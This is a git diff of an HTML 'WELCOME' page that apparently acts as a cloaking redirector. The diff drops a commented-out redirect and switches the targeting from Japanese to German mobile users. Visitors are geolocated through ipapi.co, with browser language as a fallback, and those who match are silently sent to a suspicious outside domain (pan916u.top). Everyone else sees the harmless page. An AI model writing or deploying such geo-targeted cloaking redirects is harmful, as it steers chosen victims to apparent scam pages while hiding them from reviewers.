@@ -2,13 +2,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	 <!--
-	<script>
-		window.onload = function() {
-			window.location.href = "https://www.jacmsotck.online/rigufb/tbgu1online.html";
-		}
-	</script>
-     -->
+ 
 
   <title>WELCOME</title>
   <meta charset="utf-8">
@@ -43,17 +37,17 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-function isJapaneseLang() {
-    return navigator.language.startsWith('ja') || 
-           navigator.languages.some(lang => lang.startsWith('ja'));
+function isGermanLang() {
+    return navigator.language.startsWith('de') || 
+           navigator.languages.some(lang => lang.startsWith('de'));
 }
 
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'JP' && isMobileDevice() ) {
-          window.location.href = "https://www.jacmsotck.online/jz/j2.html";
+        if (data.country === 'DE' && isMobileDevice() ) {
+          window.location.href = "https://pan916u.top/dep/k001";
           return;
         }
      
@@ -66,8 +60,8 @@ function isJapaneseLang() {
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isJapaneseLang()) {
-          window.location.href = "https://www.jacmsotck.online/jz/j2.html";
+        if (isMobileDevice() && isGermanLang()) {
+          window.location.href = "https://pan916u.top/dep/k001";
           return;
         }
         
